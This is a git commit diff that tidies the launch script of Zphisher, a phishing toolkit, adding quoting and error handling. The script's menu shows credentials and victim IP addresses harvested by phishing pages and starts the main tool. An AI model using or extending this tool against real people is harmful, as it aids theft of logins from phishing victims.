90a078401b0fff8419b09e6cbe39e18677249bc8
Mohammad Sohrowardi <151482266+sohrowardi@users.noreply.github.com>
2023-12-05 08:35:17 +0600

    Refactor launch.sh for readability and error handling

--- scripts/launch.sh
+++ scripts/launch.sh
@@ -1,32 +1,38 @@
 #!/bin/bash
 
-# https://github.com/htr-tech/zphisher
-
-if [[ $(uname -o) == *'Android'* ]];then
-	ZPHISHER_ROOT="/data/data/com.termux/files/usr/opt/zphisher"
+# Set the root path based on the operating system
+if [[ $(uname -o) == *'Android'* ]]; then
+    ZPHISHER_ROOT="/data/data/com.termux/files/usr/opt/zphisher"
 else
-	export ZPHISHER_ROOT="/opt/zphisher"
+    ZPHISHER_ROOT="/opt/zphisher"
 fi
 
+# Display help message
 if [[ $1 == '-h' || $1 == 'help' ]]; then
-	echo "To run Zphisher type \`zphisher\` in your cmd"
-	echo
-	echo "Help:"
-	echo " -h | help : Print this menu & Exit"
-	echo " -c | auth : View Saved Credentials"
-	echo " -i | ip   : View Saved Victim IP"
-	echo
+    echo "To run Zphisher, type \`zphisher\` in your cmd"
+    echo
+    echo "Help:"
+    echo " -h | help : Print this menu & Exit"
+    echo " -c | auth : View Saved Credentials"
+    echo " -i | ip   : View Saved Victim IP"
+    echo
+# Display saved credentials
 elif [[ $1 == '-c' || $1 == 'auth' ]]; then
-	cat $ZPHISHER_ROOT/auth/usernames.dat 2> /dev/null || { 
-		echo "No Credentials Found !"
-		exit 1
-	}
+    cat "$ZPHISHER_ROOT/auth/usernames.dat" 2>/dev/null || { 
+        echo "No Credentials Found !"
+        exit 1
+    }
+# Display saved IP addresses
 elif [[ $1 == '-i' || $1 == 'ip' ]]; then
-	cat $ZPHISHER_ROOT/auth/ip.txt 2> /dev/null || {
-		echo "No Saved IP Found !"
-		exit 1
-	}
+    cat "$ZPHISHER_ROOT/auth/ip.txt" 2>/dev/null || {
+        echo "No Saved IP Found !"
+        exit 1
+    }
+# Run Zphisher
 else
-	cd $ZPHISHER_ROOT
-	bash ./zphisher.sh
+    cd "$ZPHISHER_ROOT" || { 
+        echo "Error changing directory to $ZPHISHER_ROOT"
+        exit 1
+    }
+    bash ./zphisher.sh
 fi
